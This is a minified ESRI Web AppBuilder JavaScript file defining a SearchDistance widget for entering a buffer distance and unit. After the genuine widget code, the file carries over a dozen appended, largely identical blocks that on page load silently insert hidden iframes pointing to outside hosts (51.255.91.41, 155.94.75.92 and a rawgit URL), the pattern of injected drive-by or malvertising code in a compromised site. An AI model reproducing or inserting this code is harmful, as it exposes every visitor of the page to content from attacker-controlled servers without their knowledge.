// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/SearchDistance.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"cbxDiv"\x3e\x3c/div\x3e\r\n\t\x3ctable style\x3d"table-layout:fixed;width:100%;"\x3e\r\n\t\t\x3ccolgroup\x3e\r\n\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"15px"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\x3c/colgroup\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"numberTextBox" data-dojo-type\x3d"dijit/form/NumberTextBox"\r\n\t\t\t\t\t data-dojo-props\x3d\'"required":true,intermediateChanges:false,constraints:{min:0,pattern:"#####0.##########"}\'\r\n\t\t\t\t\t style\x3d"width:100%;" data-dojo-attach-event\x3d"change:_onNumberTextBoxChanged" /\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"unitSelect"\r\n\t\t\t\t\tdata-dojo-attach-event\x3d"change:_onUnitSelectChanged" style\x3d"width:100%;"\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"MILES" selected\x3e${nls.miles}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"KILOMETERS"\x3e${nls.kilometers}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"FEET"\x3e${nls.feet}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"METERS"\x3e${nls.meters}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"YARDS"\x3e${nls.yards}\x3c/option\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"NAUTICAL_MILES"\x3e${nls.nauticalMiles}\x3c/option\x3e\r\n\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/SearchDistance.html dojo/Evented dojo/_base/lang jimu/utils jimu/dijit/CheckBox esri/tasks/GeometryService dijit/form/Select dijit/form/NumberTextBox".split(" "),function(f,g,h,k,l,m,d,e,n,b){return f([g,h,k,m],{baseClass:"jimu-dijit-searchdistance",templateString:l,lastMeters:0,tip:"",distance:0,unit:"",postMixInProperties:function(){this.inherited(arguments);this.nls=d.clone(window.jimuNls.units);
this.tip||(this.tip=window.jimuNls.searchDistance.applySearchDistance)},postCreate:function(){this.inherited(arguments);this.cbx=new n({label:this.tip,onChange:d.hitch(this,this._onCbxChanged)});this.cbx.placeAt(this.cbxDiv);this.reset();this.setDistance(this.distance);this.setUnit(this.unit);this.lastMeters=this.getMeters()},enable:function(){this.cbx.check()},disable:function(){this.cbx.uncheck()},isEnabled:function(){return this.cbx.getValue()},reset:function(){this.numberTextBox.set("value",0);
this.unitSelect.set("value","MILES")},getData:function(){return{status:this.getStatus(),isEnabled:this.isEnabled(),distance:this.getDistance(),unit:this.getUnit(),bufferUnit:this.getUnitToBuffer(),meters:this.getMeters()}},getStatus:function(){var a;this.isEnabled()?(a=this.getDistance(),a=0<a?1:0===a?0:-1):a=0;return a},getMeters:function(){var a=0,c=this.getStatus();if(0<c){var c=this.getDistance(),b=this.getUnit();"MILES"===b?a=1609.344*c:"KILOMETERS"===b?a=1E3*c:"FEET"===b?a=.3048*c:"METERS"===
b?a=c:"YARDS"===b?a=.9144*c:"NAUTICAL_MILES"===b&&(a=1852*c);a=parseFloat(a.toFixed(3))}else 0===c?a=0:0>c&&(a=-1);return a},setDistance:function(a){"number"===typeof a&&0<=a&&this.numberTextBox.set("value",a)},setUnit:function(a){a&&"string"===typeof a&&this.unitSelect.set("value",a)},tryShowValidationError:function(){this.numberTextBox.validate()||e.showValidationErrorTipForFormDijit(this.numberTextBox)},getDistance:function(){return this.numberTextBox.validate()?this.numberTextBox.get("value"):
(e.showValidationErrorTipForFormDijit(this.numberTextBox),-1)},getUnit:function(){return this.unitSelect.get("value")},getUnitToBuffer:function(){var a="";switch(this.unitSelect.get("value")){case "MILES":a=b.UNIT_STATUTE_MILE;break;case "KILOMETERS":a=b.UNIT_KILOMETER;break;case "FEET":a=b.UNIT_FOOT;break;case "METERS":a=b.UNIT_METER;break;case "YARDS":a=b.UNIT_INTERNATIONAL_YARD;break;case "NAUTICAL_MILES":a=b.UNIT_NAUTICAL_MILE}return a},_onCbxChanged:function(){this.cbx.getValue()?(this.numberTextBox.set("disabled",
!1),this.unitSelect.set("disabled",!1)):(this.numberTextBox.set("disabled",!0),this.unitSelect.set("disabled",!0));this._emitEvent()},_onNumberTextBoxChanged:function(){this._emitEvent()},_onUnitSelectChanged:function(){this._emitEvent()},_emitEvent:function(){var a=this.getData();a.meters!==this.lastMeters&&(this.lastMeters=a.meters,this.emit("change",a))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});